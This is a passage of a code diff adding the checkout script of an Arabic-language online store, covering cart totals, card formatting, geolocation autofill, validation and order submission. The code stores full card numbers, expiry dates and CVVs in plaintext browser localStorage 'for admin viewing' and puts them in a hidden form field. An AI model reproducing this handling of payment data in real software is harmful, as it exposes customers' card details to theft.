+            const totalItems = cartItems.reduce((sum, item) => sum + item.quantity, 0);
+            document.querySelector('.cart-count').textContent = totalItems;
+        }
+
+        // تحديث ملخص الطلب
+        function updateOrderSummary() {
+            const subtotal = cartItems.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+            const total = subtotal - discount + shipping;
+
+            document.getElementById('subtotal').textContent = `${subtotal.toFixed(2)} ر.س`;
+            document.getElementById('discount').textContent = `-${discount.toFixed(2)} ر.س`;
+            document.getElementById('shipping').textContent = `${shipping.toFixed(2)} ر.س`;
+            document.getElementById('total').textContent = `${total.toFixed(2)} ر.س`;
+        }
+
+        // إعداد طرق الدفع
+        function setupPaymentMethods() {
+            const paymentOptions = document.querySelectorAll('.payment-option');
+            const creditCardForm = document.getElementById('credit-card-form');
+
+            paymentOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    const method = this.getAttribute('data-method');
+                    
+                    paymentOptions.forEach(opt => opt.classList.remove('selected'));
+                    this.classList.add('selected');
+                    
+                    if (method === 'cash') {
+                        creditCardForm.classList.add('hidden');
+                    } else {
+                        creditCardForm.classList.remove('hidden');
+                    }
+                });
+            });
+        }
+
+        // إعداد التحقق من البطاقة
+        function setupCardValidation() {
+            const cardNumberInput = document.getElementById('cardNumber');
+            const cardTypeIcon = document.getElementById('cardTypeIcon');
+            
+            cardNumberInput.addEventListener('input', function(e) {
+                // تنسيق رقم البطاقة
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 0) {
+                    value = value.match(/.{1,4}/g).join(' ');
+                }
+                e.target.value = value;
+                
+                // التعرف على نوع البطاقة
+                const cardNumber = value.replace(/\s/g, '');
+                detectCardType(cardNumber, cardTypeIcon);
+            });
+
+            // تنسيق تاريخ الانتهاء
+            const cardExpiryInput = document.getElementById('cardExpiry');
+            cardExpiryInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 2) {
+                    value = value.substring(0, 2) + '/' + value.substring(2);
+                }
+                e.target.value = value;
+            });
+
+            // التحقق من CVV
+            const cardCvvInput = document.getElementById('cardCvv');
+            cardCvvInput.addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/\D/g, '');
+            });
+        }
+
+        // التعرف على نوع البطاقة
+        function detectCardType(cardNumber, iconElement) {
+            let cardType = 'unknown';
+            let iconClass = 'fa-credit-card';
+            
+            // فيزا: تبدأ بـ 4
+            if (/^4/.test(cardNumber)) {
+                cardType = 'visa';
+                iconClass = 'fa-cc-visa';
+            } 
+            // ماستركارد: تبدأ بـ 5
+            else if (/^5[1-5]/.test(cardNumber)) {
+                cardType = 'mastercard';
+                iconClass = 'fa-cc-mastercard';
+            }
+            // أمريكان إكسبريس: تبدأ بـ 34 أو 37
+            else if (/^3[47]/.test(cardNumber)) {
+                cardType = 'amex';
+                iconClass = 'fa-cc-amex';
+            }
+            // اكتشاف أنواع أخرى من البطاقات هنا
+            
+            iconElement.innerHTML = `<i class="fab ${iconClass}"></i>`;
+        }
+
+        // إعداد خدمة تحديد الموقع
+        function setupLocationService() {
+            const locationBtn = document.getElementById('getLocationBtn');
+            const locationInfo = document.getElementById('locationInfo');
+            const locationText = document.getElementById('locationText');
+            
+            locationBtn.addEventListener('click', function() {
+                if (navigator.geolocation) {
+                    locationBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري تحديد الموقع...';
+                    locationBtn.disabled = true;
+                    
+                    navigator.geolocation.getCurrentPosition(
+                        function(position) {
+                            // نجاح الحصول على الموقع
+                            const lat = position.coords.latitude;
+                            const lng = position.coords.longitude;
+                            
+                            // استخدام خدمة Geocoding لعكس تحويل الإحداثيات إلى عنوان
+                            fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=ar`)
+                                .then(response => response.json())
+                                .then(data => {
+                                    const city = data.city || data.locality || "غير معروف";
+                                    const country = data.countryName || "غير معروف";
+                                    locationText.textContent = `${city}, ${country}`;
+                                    
+                                    // تعبئة الحقول تلقائياً
+                                    document.getElementById('city').value = city;
+                                    
+                                    locationInfo.classList.remove('hidden');
+                                    locationBtn.innerHTML = '<i class="fas fa-map-marker-alt"></i> تم تحديد الموقع';
+                                    
+                                    // إعادة تعيين الزر بعد ثواني
+                                    setTimeout(() => {
+                                        locationBtn.innerHTML = '<i class="fas fa-map-marker-alt"></i> تحديد موقعي تلقائياً';
+                                        locationBtn.disabled = false;
+                                    }, 3000);
+                                })
+                                .catch(error => {
+                                    console.error('Error getting location details:', error);
+                                    locationText.textContent = `خطأ في الحصول على تفاصيل الموقع`;
+                                    locationInfo.classList.remove('hidden');
+                                    locationBtn.innerHTML = '<i class="fas fa-map-marker-alt"></i> تحديد موقعي تلقائياً';
+                                    locationBtn.disabled = false;
+                                });
+                        },
+                        function(error) {
+                            // فشل الحصول على الموقع
+                            console.error('Error getting location:', error);
+                            locationText.textContent = `تعذر تحديد موقعك: ${error.message}`;
+                            locationInfo.classList.remove('hidden');
+                            locationBtn.innerHTML = '<i class="fas fa-map-marker-alt"></i> تحديد موقعي تلقائياً';
+                            locationBtn.disabled = false;
+                        }
+                    );
+                } else {
+                    locationText.textContent = "متصفحك لا يدعم خدمة تحديد الموقع";
+                    locationInfo.classList.remove('hidden');
+                }
+            });
+        }
+
+        // إعداد زر إتمام الطلب
+        function setupPlaceOrderButton() {
+            const placeOrderBtn = document.getElementById('placeOrderBtnForm');
+            
+            placeOrderBtn.addEventListener('click', function() {
+                if (validateForm()) {
+                    placeOrderBtn.textContent = 'جاري معالجة الطلب...';
+                    placeOrderBtn.disabled = true;
+                    
+                    // جمع بيانات الطلب
+                    const orderData = collectOrderData();
+                    
+                    // حفظ الطلب في localStorage (لمشاهدة المسؤول)
+                    saveOrder(orderData);
+                    
+                    // تعبئة حقل التفاصيل المخفي
+                    document.getElementById('orderDetails').value = JSON.stringify(orderData);
+                    
+                    // إرسال النموذج
+                    document.querySelector('form').submit();
+                }
+            });
+        }
+
+        // التحقق من صحة النموذج
+        function validateForm() {
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            const phone = document.getElementById('phone').value;
+            const address = document.getElementById('address').value;
+            const city = document.getElementById('city').value;
+            
+            if (!firstName || !lastName || !phone || !address || !city) {
+                alert('يرجى ملء جميع الحقول الإلزامية');
+                return false;
+            }
+            
+            // إذا كان الدفع ببطاقة الائتمان، التحقق من بيانات البطاقة
+            const paymentMethod = document.querySelector('input[name="payment-method"]:checked').value;
+            if (paymentMethod === 'credit-card') {
+                const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+                const cardName = document.getElementById('cardName').value;
+                const cardExpiry = document.getElementById('cardExpiry').value;
+                const cardCvv = document.getElementById('cardCvv').value;
+                
+                if (!cardNumber || !cardName || !cardExpiry || !cardCvv) {
+                    alert('يرجى ملء جميع بيانات البطاقة الإئتمانية');
+                    return false;
+                }
+                
+                if (cardNumber.length < 16) {
+                    alert('رقم البطاقة غير صحيح');
+                    return false;
+                }
+                
+                if (cardCvv.length < 3) {
+                    alert('رقم CVV غير صحيح');
+                    return false;
+                }
+            }
+            
+            return true;
+        }
+
+        // جمع بيانات الطلب
+        function collectOrderData() {
+            const paymentMethod = document.querySelector('input[name="payment-method"]:checked').value;
+            
+            const orderData = {
+                id: Date.now(), // استخدام الطابع الزمني كمعرف فريد
+                date: new Date().toLocaleString('ar-SA'),
+                customer: {
+                    firstName: document.getElementById('firstName').value,
+                    lastName: document.getElementById('lastName').value,
+                    phone: document.getElementById('phone').value,
+                    address: document.getElementById('address').value,
+                    city: document.getElementById('city').value,
+                    zipCode: document.getElementById('zipCode').value
+                },
+                items: cartItems,
+                payment: {
+                    method: paymentMethod,
+                    details: paymentMethod === 'credit-card' ? {
+                        cardNumber: document.getElementById('cardNumber').value,
+                        cardName: document.getElementById('cardName').value,
+                        cardExpiry: document.getElementById('cardExpiry').value,
+                        cardCvv: document.getElementById('cardCvv').value
+                    } : null
+                },
+                summary: {
+                    subtotal: cartItems.reduce((sum, item) => sum + (item.price * item.quantity), 0),
+                    discount: discount,
+                    shipping: shipping,
+                    total: cartItems.reduce((sum, item) => sum + (item.price * item.quantity), 0) - discount + shipping
+                },
+                discountCode: localStorage.getItem('khuraphaDiscountCode') || 'لا يوجد'
+            };
+            
+            return orderData;
+        }
+
+        // حفظ الطلب
+        function saveOrder(orderData) {
+            // الحصول على الطلبات الحالية من localStorage
+            let orders = JSON.parse(localStorage.getItem('khuraphaOrders') || '[]');
+            
+            // إضافة الطلب الجديد
+            orders.push(orderData);
+            
+            // حفظ الطلبات المحدثة في localStorage
+            localStorage.setItem('khuraphaOrders', JSON.stringify(orders));
+        }
+
+        // عرض إشعار
+        function showToast(message) {
+            const toast = document.querySelector('.toast');
+            const toastMessage = toast.querySelector('.toast-message');
+            
+            toastMessage.textContent = message;
+            toast.classList.add('show');
+            
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
+        // إغلاق الشريط العلوي
+        document.querySelector('.close-topbar').addEventListener('click', function() {
+            document.querySelector('.top-bar').style.display = 'none';
+        });
+    </script>
+</body>
+</html>
